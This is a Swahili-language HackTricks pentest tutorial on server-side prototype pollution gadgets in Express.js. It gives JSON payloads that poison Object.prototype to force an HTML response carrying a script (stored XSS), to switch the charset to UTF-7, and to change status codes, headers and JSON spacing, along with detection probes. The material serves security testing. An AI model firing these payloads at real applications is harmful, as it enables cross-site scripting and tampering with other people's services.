# Vifaa vya Uharibifu wa Mfano wa Express

<details>

<summary><strong>Jifunze kuhusu udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inayotangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Hudumisha Majibu ya XSS

**Kwa maelezo zaidi [angalia utafiti asilia](https://portswigger.net/research/server-side-prototype-pollution)**

### Badilisha aina ya yaliyomo ya JSON kuwa HTML

Katika programu ya Express inayotumia **aina ya yaliyomo ya JSON** na kurejelea JSON:
```javascript
app.use(bodyParser.json({type: 'application/json'}));
app.post('/', function(req, res){
_.merge({}, req.body);
res.send(req.body);
});
```
Katika kesi hizi, XSS kawaida haiwezekani na aina ya yaliyomo ya JSON. Walakini, kwa kutumia uchafuzi wa prototype tunaweza **kuchanganya Express kutumikia jibu la HTML.** Udhaifu huu unategemea matumizi ya programu ya **`res.send(obj)`** na kutumia kipambatishaji wa mwili na aina ya yaliyomo ya application/json.
```json
{"__proto__":{"_body":true,"body":"<script>evil()"}}
```
Kwa **kuchafua** mali za **`body`** na **`_body`**, inawezekana kusababisha **Express kutumikia aina ya yaliyomo ya HTML** na kurejeleza mali ya `_body`, ikisababisha XSS iliyohifadhiwa.

### Rejeleza UTF7

Inawezekana kufanya express **kurejeleza yaliyomo ya UTF-7 kwa**:
```json
{"__proto__":{"content-type": "application/json; charset=utf-7"}}
```
## Mbinu Salama za Uchanganuzi

### Nafasi za JSON

PP ifuatayo itafanya sifa ndani ya JSON kuwa na nafasi ya ziada ambayo haitavunja utendaji:
```json
{"__proto__":{"json spaces": " "}}
```
Kisha JSON iliyorejeshwa itaonekana kama:
```json
{"foo":  "bar"} -- Note the extra space
```
### Vichwa Vilivyofunuliwa

Gadgeti ya PP ifuatayo itafanya seva itume tena kichwa cha HTTP: **`Access-Control-Expose_headers: foo`**
```json
{"__proto__":{"exposedHeaders":["foo"]}}
```
Inahitaji **moduli ya CORS iwe imewekwa**

### **Njia ya OPTIONS**

Kwa mzigo ufuatao, ni **inawezekana kuficha njia kutoka kwenye jibu la OPTIONS**:
```javascript
// Original reponse: POST,GET,HEAD

// Payload:
{"__proto__":{"head":true}}

//New response: POST;GET
```
### **Hali**

Inawezekana kubadilisha **kodi ya hali iliyorudishwa** kwa kutumia mzigo wa PP ufuatao:
```json
{"__proto__":{"status":510}}
```
### Kosa

Wakati unapoweka kwa kigezo na kigezo cha msingi kama vile herufi, inazalisha **operesheni ya no-op tangu kigezo lazima kiwe kitu**. Ikiwa unajaribu kuweka kigezo cha kigezo kwa `Object.prototype` yenyewe, hii italeta **kutupwa kwa kosa**. Tunaweza kutumia tabia hizi mbili kugundua ikiwa uchafuzi wa kigezo umefanikiwa:
```javascript
({}).__proto__.__proto__={}//throws type exception
({}).__proto__.__proto__="x"//no-op does not throw exception
```
### Thamani Iliyorejeshwa

Wakati programu inajumuisha kitu katika jibu lake, kuunda sifa na **jina lisilo la kawaida pamoja na `__proto__`** kunaweza kuwa na ufahamu. Hasa, ikiwa **sifa lisilo la kawaida pekee ndiyo inayorejeshwa** katika jibu, hii inaweza kuashiria udhaifu wa programu:
```json
{"unusualName":"value","__proto__":"test"}
```
Zaidi ya hayo, katika hali ambapo maktaba kama Lodash inatumika, kuweka mali kwa njia ya uchafuzi wa kigezo (PP) na moja kwa moja ndani ya kifaa kinatoa njia nyingine ya uchunguzi. Ikiwa mali kama hiyo haipo katika jibu, inaonyesha kuwa Lodash inathibitisha uwepo wa mali katika kifaa cha lengo kabla ya kufanya muunganisho.
```javascript
{"__proto__":{"a":"value1"},"a":"value2","b":"value3"}
// If 'b' is the only property reflected, this indicates prototype pollution in Lodash
```
## Vinginevyo

### Ruhusu Alama za Kipindi

Kuna chaguo katika Express ambacho kinakuwezesha **kuunda vitu kutoka kwa vigezo vya herufi za utafutaji**.\
Unaweza kuitumia kwa hakika katika mlolongo wa kasoro ili kudukua udhaifu wa **uchafuzi wa mfano**.
```json
{"__proto__":{"allowDots":true}}
```
**`?foo.bar=baz` inazalisha kitu katika Node.**

## Marejeo

* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
